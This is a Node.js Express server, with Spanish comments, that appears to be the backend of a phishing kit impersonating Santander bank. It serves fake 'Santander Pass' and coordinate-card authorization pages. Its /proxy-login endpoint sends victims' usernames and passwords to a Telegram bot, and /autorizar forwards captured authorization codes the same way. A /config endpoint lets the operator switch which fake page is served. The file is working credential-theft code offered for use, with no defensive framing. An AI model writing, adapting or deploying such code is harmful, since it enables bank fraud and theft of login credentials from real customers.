const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
  res.json(cfg);
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  fs.writeFileSync("config.json", JSON.stringify(req.body, null, 2));
  res.json(req.body);
});

// Ruta directa al admin (URL corta)
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));

  if (cfg.tipoAutorizacion === "santander") {
    // Flujo Santander Pass
    res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
    return;
  }

  if (cfg.tipoAutorizacion === "coordenadas") {
    // Flujo Coordenadas → luego SMS
    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
    return;
  }

  // Valor por defecto
  res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    // Enviar a Telegram
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });

    res.json({ status: "ok", mensaje });
  } catch (err) {
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Nuevo endpoint para login → enviar credenciales a Telegram y seguir flujo
app.post("/proxy-login", async (req, res) => {
  const { usuario, clave } = req.body;
  const mensaje = `Login recibido:\nUsuario: ${usuario}\nClave: ${clave}`;

  try {
    // Enviar credenciales a Telegram
    await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
    });

    // Responder al frontend para que redirija a la siguiente etapa
    res.json({ status: "ok", mensaje: "Credenciales enviadas a Telegram" });
  } catch (err) {
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
